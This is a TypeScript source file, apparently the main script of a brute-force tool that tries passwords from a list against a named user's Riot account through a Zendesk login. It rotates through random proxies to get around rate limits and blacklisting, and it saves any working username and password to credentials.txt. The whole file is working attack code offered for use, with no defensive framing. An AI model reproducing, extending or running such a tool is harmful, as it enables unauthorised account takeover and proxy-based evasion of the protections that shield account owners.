import { Zendesk } from "./riot/Zendesk.js";
import { HttpsProxyAgent } from "https-proxy-agent";
import * as fs from "fs";
import { AuthFailureError, LoginFailureError, RateLimitedError, SessionCookieError } from "./errors/index.js";
import { Logger } from "./util/Logger.js";
import config from "./config.json" assert { type: "json" };
import { readLines, sleep } from "./util/funcs.js";

/**
 * DO NOT EDIT BELOW THIS LINE
 */
const USERNAME = config.username;

const logger = Logger.getInstance();

// Read passlist & proxy list
const passwords = readLines(config.pass_list_path);
const proxies = readLines(config.proxy_list_path);

let found = false;
let foundPassword = "";

const saveCredentialsAndExit = () => {
  try {
    fs.writeFileSync("./credentials.txt", `${USERNAME}:${foundPassword}`, { encoding: "utf-8", flag: "w" });
  } catch (err) {
    logger.error("Could not write password to file.");
  }
  process.exit(0);
}

const checkFound = () => {
  if (found) saveCredentialsAndExit();
}

const doWork = async (password: string) => {
  for (; ;) {
    checkFound();

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxy) continue;
    const split = proxy.split(":");
    const proxyHost = split[0];
    const proxyPort = split[1];
    let proxyUser = null;
    let proxyPass = null;

    // check if proxy has credentials
    if (split.length >= 4) {
      proxyUser = split[2];
      proxyPass = split[3];
    }

    const proxyAddress = `${proxyHost}:${proxyPort}`;
    const proxyUrl = (proxyUser && proxyPass)
      ? `http://${proxyUser}:${proxyPass}@${proxyHost}:${proxyPort}`
      : `http://${proxyHost}:${proxyPort}`;

    const proxyAgent = new HttpsProxyAgent(proxyUrl);

    logger.log(`Trying ${USERNAME}:${password} on Proxy: ${proxyAddress}`);
    try {
      const zendesk = new Zendesk(USERNAME, password, proxyAgent);
      await zendesk.login();
      logger.success(`Found credentials - ${USERNAME}:${password}`);
      found = true;
      foundPassword = password;
    } catch (err: any) {
      // password probably wrong, go to next password
      if (err instanceof AuthFailureError || err instanceof LoginFailureError) {
        break;
      }

      // proxy rate limited, try next proxy
      if (err instanceof RateLimitedError) {
        logger.error(err.message);
        continue;
      }

      // proxy probably blacklisted, try next proxy
      if (err instanceof SessionCookieError) {
        logger.error(err.message);
        continue;
      }

      // most likely a proxy error, try next proxy
      logger.error(err.message)
      continue;
    }
    break;

  }
}

const start = async () => {
  let i = 0;
  for (const password of passwords) {
    checkFound();

    if (!password) continue;
    if (password.length < 8) continue;

    doWork(password);
    await sleep(500); // if you have thousands of proxies you might not even need this
  }
}

start();

